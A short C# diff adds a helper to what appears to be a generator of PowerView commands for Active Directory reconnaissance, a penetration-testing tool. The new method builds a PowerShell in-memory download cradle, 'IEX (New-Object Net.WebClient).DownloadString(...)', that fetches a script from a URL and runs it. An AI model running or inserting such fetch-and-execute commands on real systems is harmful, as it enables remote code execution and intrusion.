@@ -43,4 +43,10 @@ public static class GeneratorHelpers
 
     // The PowerView import line used by every PowerView-based generator.
     public const string PowerViewImport = "Import-Module .\\PowerView.ps1";
+
+    // How PowerView gets loaded: a local import, or an in-memory download cradle from a URL.
+    public static string PowerViewImportLine(bool download, string url)
+        => (download && url.Length > 0)
+            ? $"IEX (New-Object Net.WebClient).DownloadString('{EscapeSingleQuotes(url)}')"
+            : PowerViewImport;
 }
